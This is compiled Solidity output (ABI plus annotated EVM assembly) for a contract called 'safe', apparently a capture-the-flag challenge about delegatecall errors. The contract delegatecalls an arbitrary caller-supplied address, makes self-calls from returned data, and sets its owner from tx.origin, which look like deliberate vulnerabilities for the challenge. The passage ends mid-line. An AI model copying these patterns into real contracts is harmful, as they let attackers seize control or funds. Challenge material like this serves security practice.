{
	"shoot/3/delegatecall调用出错/1.sol": {
		"safe": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "setOwner",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "complete",
					"outputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "val",
							"type": "uint256"
						}
					],
					"name": "setPassword",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "getReturns",
					"outputs": [
						{
							"name": "sel",
							"type": "bytes4"
						},
						{
							"name": "val",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "_target",
							"type": "address"
						}
					],
					"name": "gift",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "score",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "isCompleted",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"payable": true,
					"stateMutability": "payable",
					"type": "fallback"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n  mstore(0x40, 0x80)\n    /* \"shoot/3/delegatecall调用出错/1.sol\":936:992  constructor()public{\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"shoot/3/delegatecall调用出错/1.sol\":936:992  constructor()public{\r... */\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":974:984  msg.sender */\n  caller\n    /* \"shoot/3/delegatecall调用出错/1.sol\":966:971  owner */\n  0x0\n  dup1\n    /* \"shoot/3/delegatecall调用出错/1.sol\":966:984  owner = msg.sender */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x40caae06\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x522e1177\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x68e9a07e\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xade58ccb\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xcbfc4bce\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xefedc669\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xfa391c64\n      eq\n      tag_8\n      jumpi\n    tag_1:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_11\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_11:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n      pop\n      tag_12\n      jump(tag_13)\n    tag_12:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n    tag_3:\n      tag_14\n      jump(tag_15)\n    tag_14:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_16:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n      pop\n      tag_17\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_18)\n    tag_17:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n      pop\n      tag_20\n      jump(tag_21)\n    tag_20:\n      mload(0x40)\n      dup1\n      dup4\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n      pop\n      tag_23\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_24)\n    tag_23:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_25:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n      pop\n      tag_26\n      jump(tag_27)\n    tag_26:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_28:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n      pop\n      tag_29\n      jump(tag_30)\n    tag_29:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n    tag_13:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":886:890  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:891  msg.sender ==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:875  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:891  msg.sender ==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":857:892  require(msg.sender ==address(this)) */\n      iszero\n      iszero\n      tag_32\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_32:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":911:920  tx.origin */\n      origin\n        /* \"shoot/3/delegatecall调用出错/1.sol\":903:908  owner */\n      0x0\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":903:920  owner = tx.origin */\n      0x100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n    tag_15:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1074:1075  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1060:1064  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1052:1073  address(this).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1052:1075  address(this).balance>0 */\n      gt\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1044:1076  require(address(this).balance>0) */\n      iszero\n      iszero\n      tag_34\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_34:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1108:1112  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1100:1121  address(this).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1090:1099  msg.value */\n      callvalue\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1090:1121  msg.value>address(this).balance */\n      gt\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1087:1158  if(msg.value>address(this).balance){\r... */\n      iszero\n      tag_35\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1143:1146  100 */\n      0x64\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1137:1142  score */\n      0x2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1137:1146  score=100 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1087:1158  if(msg.value>address(this).balance){\r... */\n    tag_35:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n    tag_18:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1672:1676  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1677  msg.sender==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1662  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1677  msg.sender==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1644:1678  require(msg.sender==address(this)) */\n      iszero\n      iszero\n      tag_37\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_37:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1723:1726  val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1721:1722  1 */\n      0x1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1714:1727  sstore(1,val) */\n      sstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1698:1738  { \r... */\n      pop\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n    tag_21:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1794:1804  bytes4 sel */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1806:1817  uint256 val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1882:1886  0x24 */\n      0x24\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1866:1880  returndatasize */\n      returndatasize\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1863:1887  eq(returndatasize, 0x24) */\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1856:1888  iszero(eq(returndatasize, 0x24)) */\n      iszero\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1853:1855  if */\n      iszero\n      tag_39\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1901:1902  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1898:1899  0 */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1891:1903  revert(0, 0) */\n      revert\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1853:1855  if */\n    tag_39:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1936:1940  0x40 */\n      0x40\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1930:1941  mload(0x40) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1978:1982  0x24 */\n      0x24\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1975:1976  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1970:1973  ptr */\n      dup3\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1955:1983  returndatacopy(ptr, 0, 0x24) */\n      returndatacopy\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2020:2086  0xffffffff00000000000000000000000000000000000000000000000000000000 */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2014:2017  ptr */\n      dup2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2008:2018  mload(ptr) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2004:2087  and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) */\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1997:2087  sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) */\n      swap3\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2124:2127  ptr */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2118:2122  0x04 */\n      0x4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2114:2128  add(0x04, ptr) */\n      add\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2108:2129  mload(add(0x04, ptr)) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2101:2129  val := mload(add(0x04, ptr)) */\n      swap2\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1838:2140  {\r... */\n      pop\n      swap1\n      swap2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n    tag_24:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1336:1346  bytes4 sel */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1347:1358  uint256 val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1387:1399  bool success */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1298:1303  false */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1303  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false */\n      iszero\n      iszero\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1237  _target */\n      dup5\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1250  _target.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1274:1292  this.gift.selector */\n      mul(0x100000000000000000000000000000000000000000000000000000000, 0xcbfc4bce)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1294  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_41:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_41)\n    tag_42:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1294  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_44\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x1\n      dup4\n      0x20\n      sub\n      0x100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_44:\n      pop\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1303  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false */\n      iszero\n      iszero\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1222:1324  require(_target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false, \"unsafe execution\") */\n      iszero\n      iszero\n      tag_45\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x10\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x756e7361666520657865637574696f6e00000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_45:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1374  getReturns() */\n      tag_46\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1372  getReturns */\n      tag_21\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1374  getReturns() */\n      jump\t// in\n    tag_46:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1335:1374  (bytes4 sel,uint256 val) = getReturns() */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1410:1414  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1402:1420  address(this).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1421:1424  sel */\n      dup4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1402:1425  address(this).call(sel) */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1387:1425  bool success = address(this).call(sel) */\n      swap1\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1444:1451  success */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1436:1470  require(success,\"gift call error\") */\n      iszero\n      iszero\n      tag_47\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xf\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x676966742063616c6c206572726f720000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_47:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1500:1504  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1510  address(this).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":789:814  this.setPassword.selector */\n      mul(0x100000000000000000000000000000000000000000000000000000000, 0x68e9a07e)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1532:1535  val */\n      dup4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1511:1536  abi.encodePacked(SET,val) */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x4\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1511:1536  abi.encodePacked(SET,val) */\n      swap1\n      0x40\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1537  address(this).call(abi.encodePacked(SET,val)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_48:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_49\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_48)\n    tag_49:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1537  address(this).call(abi.encodePacked(SET,val)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_51\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x1\n      dup4\n      0x20\n      sub\n      0x100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_51:\n      pop\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1483:1537  success =address(this).call(abi.encodePacked(SET,val)) */\n      swap1\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1556:1563  success */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1548:1578  require(success,\"call failed\") */\n      iszero\n      iszero\n      tag_52\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xb\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x63616c6c206661696c6564000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_52:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n    tag_27:\n      sload(0x2)\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n    tag_30:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2240:2241  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2234:2239  score */\n      0x2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2234:2241  score=0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* 